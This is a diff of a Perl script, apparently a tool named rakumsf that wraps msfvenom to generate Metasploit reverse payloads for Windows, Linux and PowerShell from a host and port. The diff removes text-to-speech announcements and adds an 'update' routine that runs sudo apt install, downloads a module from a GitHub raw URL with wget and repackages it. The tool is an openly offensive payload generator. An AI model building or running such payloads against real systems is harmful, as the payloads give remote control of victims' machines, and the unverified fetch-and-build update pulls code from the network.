@@ -55,6 +55,11 @@ my $host;
 my $port;
 my $payload_type;
 
+if (@ARGV && $ARGV[0] eq 'update') {
+    update_script();
+    exit;
+}
+
 GetOptions(
     'host=s'   => \$host,
     'port=i'   => \$port,
@@ -109,7 +114,7 @@ sub generate_payload_windows {
     my $options = "LHOST=$host LPORT=$port";
     my $command = "msfvenom -p $payload $options -f exe > $output_file";
     system($command);
-    system("spd-say 'Windows payload generated rakumsf.exe'");
+
     print "Windows payload generated: $output_file\n";
 }
 
@@ -120,7 +125,7 @@ sub generate_payload_linux {
     my $options = "LHOST=$host LPORT=$port";
     my $command = "msfvenom -p $payload $options -f elf > $output_file";
     system($command);
-    system("spd-say 'linux payload generated rakumsf'");
+
     print "Linux payload generated: $output_file\n";
 }
 
@@ -194,4 +199,10 @@ sub generate_payload_powershell {
     my $command = "msfvenom -p $payload $options -f psh > $output_file";
     system($command);
     print "PowerShell payload generated: $output_file\n";
+}
+sub update_script{
+system("sudo apt install libpar-packer-perl");
+system("wget https://raw.githubusercontent.com/RakuCyber/rakumsf/main/rakumsf.pm");
+system("rm -fr rakumsf");
+system("pp -o rakumsf rakumsf.pm");
 }
